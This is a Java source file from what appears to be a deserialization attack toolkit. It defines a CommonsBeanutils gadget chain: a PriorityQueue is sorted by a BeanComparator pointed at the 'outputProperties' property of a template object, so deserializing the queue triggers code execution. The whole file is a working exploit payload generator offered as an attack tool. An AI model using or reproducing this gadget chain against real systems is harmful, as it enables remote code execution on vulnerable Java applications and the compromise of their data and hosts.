package com.summersec.attack.deser.payloads;

import com.summersec.attack.deser.payloads.annotation.Authors;
import com.summersec.attack.deser.payloads.annotation.Dependencies;
import com.summersec.attack.deser.util.Reflections;
import com.summersec.attack.deser.util.StandardExecutorClassLoader;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.logging.log4j.util.PropertySource;

import java.util.Comparator;
import java.util.PriorityQueue;
import java.util.Queue;

// org.apache.logging.log4j
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
@Authors({"水滴"})

public class CommonsBeanutilsPropertySource_192 implements ObjectPayload<Queue<Object>>{

    @Override
    public Queue<Object> getObject(Object template) throws Exception {
        PropertySource propertySource1 = new PropertySource() {
            @Override
            public int getPriority() {
                return 0;
            }

        };
        PropertySource propertySource2 = new PropertySource() {

            @Override
            public int getPriority() {
                return 0;
            }

        };
//        BeanComparator beanComparator = new BeanComparator(null, new PropertySource.Comparator());
        StandardExecutorClassLoader classLoader = new StandardExecutorClassLoader("1.9.2");
        Class u = classLoader.loadClass("org.apache.commons.beanutils.BeanComparator");
        System.out.println(u.getPackage());

//        BeanComparator beanComparator = new BeanComparator(null, new AttrCompare());
        Object beanComparator = u.getDeclaredConstructor(String.class, Comparator.class).newInstance(null, new PropertySource.Comparator());



        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, (Comparator<? super Object>) beanComparator);

        queue.add(propertySource1);
        queue.add(propertySource2);


        Reflections.setFieldValue(queue, "queue", new Object[] { template, template });

        Reflections.setFieldValue(beanComparator, "property", "outputProperties");

        return (Queue)queue;
    }
}
